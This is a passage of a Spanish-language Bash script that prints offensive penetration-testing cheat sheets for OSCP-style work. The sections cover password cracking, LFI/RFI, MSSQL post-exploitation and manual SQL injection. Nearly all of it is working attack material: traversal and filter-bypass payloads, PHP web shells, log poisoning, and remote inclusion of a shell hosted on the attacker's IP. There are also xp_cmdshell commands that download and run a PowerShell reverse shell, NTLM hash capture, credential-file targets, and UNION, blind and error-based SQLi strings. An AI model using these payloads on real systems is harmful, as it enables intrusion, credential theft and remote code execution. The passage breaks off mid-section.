    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}hashcat -m MODE hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC} ${DIM}-> ?Clave OSCP!${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    printf "  ${LPURPLE}|${NC}   ${WHITE}%-7s %-30s${NC}\n" "MODO" "TIPO"
    echo -e "  ${LPURPLE}|${NC}   -------------------------------------"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "0"     "MD5"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "100"   "SHA-1"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "1000"  "NTLM (Windows)"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "1400"  "SHA-256"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "1800"  "sha512crypt (\$6\$)"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "3200"  "bcrypt (\$2a\$)"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "500"   "md5crypt (\$1\$)"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "5600"  "NTLMv2 (responder)"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "13100" "Kerberoasting TGS"
    printf "  ${LPURPLE}|${NC}   ${YELLOW}%-7s${NC} %-30s\n" "18200" "AS-REP Roasting"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- JOHN ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}john --format=NT hash.txt${NC} ${DIM}-> Forzar formato${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}john --show hash.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- EXTRAER HASHES ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Linux:${NC}       ${YELLOW}unshadow /etc/passwd /etc/shadow > h.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}SAM:${NC}         ${YELLOW}impacket-secretsdump -sam SAM -system SYSTEM LOCAL${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}DC:${NC}          ${YELLOW}impacket-secretsdump user:pass@${IP:-TARGET}${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Zip/SSH:${NC}     ${YELLOW}zip2john f.zip > h.txt${NC}  /  ${YELLOW}ssh2john id_rsa > h.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Otros:${NC}       ${YELLOW}keepass2john db.kdbx${NC} / ${YELLOW}pfx2john cert.pfx${NC} / ${YELLOW}pdf2john doc.pdf${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- WORDLISTS ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/usr/share/wordlists/rockyou.txt${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/usr/share/wordlists/fasttrack.txt${NC}  ${DIM}-> rapida${NC}"
    echo -e "  ${LPURPLE}+----------------------------------------------------------------------+${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}


# =============================================================================
# -- [LFI] LFI/RFI Cheatsheet -> File Inclusion --------------------------------
# =============================================================================
lfi_cheatsheet() {
    banner
    log_section "LFI/RFI CHEATSHEET — File Inclusion"

    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}📁 LFI / RFI -> File Inclusion Cheatsheet${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Parametros vulnerables tipicos: ?page= ?file= ?lang= ?include= ?path=${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 1. LFI B?SICO -> Path Traversal ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}../../../../../../../etc/passwd${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Bypass filtros comunes:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}....//....//....//....//etc/passwd${NC}       ${DIM}-> doble punto bypass${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}..%252f..%252f..%252fetc/passwd${NC}         ${DIM}-> doble URL encoding${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}%2e%2e%2f%2e%2e%2fetc/passwd${NC}           ${DIM}-> URL encode ../${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/etc/passwd%00${NC}                          ${DIM}-> null byte (PHP < 5.3)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/etc/passwd%00.php${NC}                      ${DIM}-> null byte + extension forzada${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/....\\\\//....\\\\//etc/passwd${NC}               ${DIM}-> mixed slash${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 2. PHP WRAPPERS (leer codigo fuente) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Requiere PHP. Muestra codigo fuente en base64 (no lo ejecuta):${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Leer archivos PHP en base64:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}php://filter/convert.base64-encode/resource=index.php${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}php://filter/convert.base64-encode/resource=config${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Decodificar: echo 'BASE64_OUTPUT' | base64 -d${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Ejecucion de codigo (RCE):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}php://input${NC}  ${DIM}-> POST body se ejecuta como PHP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}curl -X POST 'http://target/page.php?file=php://input' --data '<?php system(\"whoami\"); ?>'${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Es <?php system(\$_GET['cmd']);?> en base64${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}expect://whoami${NC}  ${DIM}-> si extension expect esta habilitada (raro)${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 3. LOG POISONING -> RCE ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Inyectas PHP en un log, luego lo incluyes con LFI:${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Inyectar en User-Agent (Apache):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}curl -A '<?php system(\$_GET[\"cmd\"]); ?>' http://target/whatever${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Incluir el log:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}?page=../../../var/log/apache2/access.log&cmd=whoami${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Rutas de logs comunes:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/log/apache2/access.log${NC}    ${DIM}-> Apache (Debian/Ubuntu)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/log/httpd/access_log${NC}      ${DIM}-> Apache (RHEL/CentOS)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/log/nginx/access.log${NC}      ${DIM}-> Nginx${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/log/auth.log${NC}              ${DIM}-> SSH login (inyectar en username)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/log/mail.log${NC}              ${DIM}-> SMTP log poisoning${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/proc/self/environ${NC}             ${DIM}-> variables de entorno (User-Agent)${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 4. RFI -> Remote File Inclusion ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Solo funciona si allow_url_include=On en php.ini (raro pero sale):${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Crear shell en tu Kali:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Levantar servidor:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}python3 -m http.server 80${NC}  ${DIM}-> o usa [BIN] -> [SRV]${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 3 -> Incluir remotamente:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}?page=http://$my_ip/shell.php&cmd=whoami${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}?page=http://$my_ip/shell.txt${NC}  ${DIM}-> .txt para bypass extension${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- 5. ARCHIVOS INTERESANTES ---${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}🐧 Linux:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/etc/passwd${NC}                    ${DIM}-> usuarios del sistema${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/etc/shadow${NC}                    ${DIM}-> hashes (necesita root)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/etc/hosts${NC}                     ${DIM}-> hostnames internos${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/home/*/.ssh/id_rsa${NC}            ${DIM}-> claves SSH privadas${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/home/*/.bash_history${NC}          ${DIM}-> historial de comandos${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/www/html/wp-config.php${NC}    ${DIM}-> creds MySQL de WordPress${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/var/www/html/.env${NC}             ${DIM}-> variables de entorno (Laravel, etc)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/proc/self/cmdline${NC}             ${DIM}-> comando que lanzo el proceso${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}/proc/self/status${NC}              ${DIM}-> info del proceso actual${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}🪟 Windows:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\Windows\\System32\\drivers\\etc\\hosts${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\Windows\\System32\\config\\SAM${NC}    ${DIM}-> hashes locales (bloqueado en uso)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\Windows\\repair\\SAM${NC}            ${DIM}-> backup de SAM${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\inetpub\\wwwroot\\web.config${NC}   ${DIM}-> config IIS con creds${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\inetpub\\logs\\LogFiles\\${NC}       ${DIM}-> logs de IIS${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\Users\\*\\Desktop\\proof.txt${NC}    ${DIM}-> 🏳 flag OSCP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\xampp\\apache\\conf\\httpd.conf${NC}  ${DIM}-> config Apache XAMPP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}C:\\xampp\\passwords.txt${NC}           ${DIM}-> creds por defecto XAMPP${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# =============================================================================
# -- [SQL] SQL Cheatsheet -> MSSQL + SQLi Manual -------------------------------
# =============================================================================
sql_cheatsheet() {
    banner
    log_section "SQL CHEATSHEET — MSSQL & SQLi Manual"

    local target_ip="${IP:-TARGET_IP}"
    local target_user="${USER_CRED:-sa}"
    local target_pass="${PASS_CRED:-PASSWORD}"
    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🗄  SQL CHEATSHEET -> OSCP${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Target: ${target_ip}   User: ${target_user}${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[1]${NC} 🗄  MSSQL -> Ataques y Post-ExplotaciÃ³n"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[2]${NC} 💉 SQLi Manual -> InyecciÃ³n SQL (UNION, Blind, Error)"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[b]${NC} Volver"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo ""
    read -rp "  $(echo -e "${CYAN}Opción:${NC} ")" sql_opt

    case $sql_opt in
        1) _mssql_cheatsheet ;;
        2) _sqli_cheatsheet ;;
        b|B) return ;;
        *) log_warn "Opción no válida." ;;
    esac

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- MSSQL Attacks Sub-cheatsheet ---------------------------------------------
_mssql_cheatsheet() {
    local target_ip="${IP:-TARGET_IP}"
    local target_user="${USER_CRED:-sa}"
    local target_pass="${PASS_CRED:-PASSWORD}"
    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🗄  MSSQL -> Ataques Post-ExplotaciÃ³n${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- CONEXI?N ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-mssqlclient ${target_user}:${target_pass}@${target_ip} -windows-auth${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}impacket-mssqlclient ${target_user}:${target_pass}@${target_ip}${NC}  ${DIM}-> sin auth Windows${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}sqsh -S ${target_ip} -U ${target_user} -P ${target_pass}${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- enumeracion INICIAL ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT name FROM master.dbo.sysdatabases;${NC}          ${DIM}-> listar databases${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT name FROM sys.tables;${NC}                       ${DIM}-> tablas de la DB actual${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT * FROM INFORMATION_SCHEMA.TABLES;${NC}           ${DIM}-> todas las tablas${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT SYSTEM_USER;${NC}                                ${DIM}-> usuario actual SQL${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT IS_SRVROLEMEMBER('sysadmin');${NC}                ${DIM}-> eres sysadmin? (1=si)${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- xp_cmdshell -> RCE ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Si eres sysadmin, puedes ejecutar comandos en el sistema:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Habilitar xp_cmdshell:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC sp_configure 'show advanced options', 1; RECONFIGURE;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Ejecutar comandos:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC xp_cmdshell 'whoami';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\proof.txt';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 3 -> Reverse shell:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC xp_cmdshell 'powershell -e JABj...[BASE64]';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Genera el base64 con:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}echo 'IEX(New-Object Net.WebClient).DownloadString(\"http://$my_ip/Invoke-PowerShellTcp.ps1\")' | iconv -t UTF-16LE | base64 -w 0${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- IMPERSONATION (escalar dentro de SQL) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Si tu usuario puede 'impersonate' a otro con mas privilegios:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Ver quien puedo suplantar:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Suplantar y habilitar xp_cmdshell:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXECUTE AS LOGIN = 'sa';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC sp_configure 'show advanced options', 1; RECONFIGURE;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC xp_cmdshell 'whoami';${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- LINKED SERVERS (pivotar a otro SQL Server) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Enumerar linked servers:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC sp_linkedservers;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT * FROM sys.servers;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Ejecutar queries en el linked server:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT * FROM OPENQUERY(\"LINKED_SRV\", 'SELECT SYSTEM_USER');${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SRV];${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SRV];${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LINKED_SRV];${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- EXTRAER CREDENCIALES ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Hashes de usuarios SQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}SELECT name, password_hash FROM sys.sql_logins;${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Crackear con hashcat -m 1731 (MSSQL 2012+)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}NTLM relay (Responder):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}1. En Kali: ${YELLOW}sudo responder -I tun0${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}2. En MSSQL: ${YELLOW}EXEC xp_dirtree '\\\\$my_ip\\share';${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}-> Responder captura el hash NTLMv2 de la cuenta de servicio${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
}

# -- SQLi Manual Sub-cheatsheet -----------------------------------------------
_sqli_cheatsheet() {
    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}💉 SQLi MANUAL -> InyecciÃ³n SQL para OSCP${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- DETECCI?N (es vulnerable?) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}'${NC}                                     ${DIM}-> error SQL = posible SQLi${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' OR 1=1-- -${NC}                           ${DIM}-> bypass login clasico${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' OR '1'='1${NC}                             ${DIM}-> sin comentario${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}admin'--${NC}                                ${DIM}-> login como admin${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}1 AND 1=1${NC}  vs  ${YELLOW}1 AND 1=2${NC}              ${DIM}-> integer-based (diff respuesta)${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- UNION-BASED SQLi ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 1 -> Encontrar numero de columnas:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' ORDER BY 1-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' ORDER BY 2-- -${NC}     ${DIM}-> incrementa hasta error -> el anterior es el num de cols${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' ORDER BY 5-- -${NC}     ${DIM}-> si error -> hay 4 columnas${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 2 -> Detectar columnas visibles:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,2,3,4-- -${NC}  ${DIM}-> ve que numeros aparecen en la pagina${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 3 -> Extraer info (en la columna visible):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,@@version,3,4-- -${NC}              ${DIM}-> version DB${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,user(),3,4-- -${NC}                 ${DIM}-> usuario actual${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,database(),3,4-- -${NC}             ${DIM}-> DB actual${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 4 -> Listar tablas:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 5 -> Listar columnas de una tabla:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Paso 6 -> Extraer datos:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users-- -${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- ERROR-BASED SQLi ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MySQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MSSQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND 1=CONVERT(int,(SELECT @@version))-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}PostgreSQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND 1=CAST((SELECT version()) AS int)-- -${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- BLIND SQLi -> Boolean-Based ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}La pagina NO muestra datos pero cambia su comportamiento (true/false):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND SUBSTRING((SELECT database()),1,1)='a'-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND (SELECT LENGTH(database()))=5-- -${NC}         ${DIM}-> longitud de nombre DB${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -${NC}  ${DIM}-> binary search${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- BLIND SQLi -> Time-Based ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Sin cambio visual. Si tarda X segundos -> true:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MySQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND IF(1=1,SLEEP(3),0)-- -${NC}                    ${DIM}-> si tarda 3s -> vulnerable${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MSSQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}'; IF (1=1) WAITFOR DELAY '0:0:3'-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}PostgreSQL:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -${NC}"
    echo ""

    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- SQLi -> RCE (Leer/Escribir archivos) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MySQL -> Leer archivos:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MySQL -> Escribir webshell:${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}' UNION SELECT 1,'<?php system(\$_GET[\"cmd\"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}MSSQL -> xp_cmdshell (ver seccion MSSQL):${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}'; EXEC xp_cmdshell 'whoami'-- -${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}PostgreSQL -> Leer archivos:${NC}"
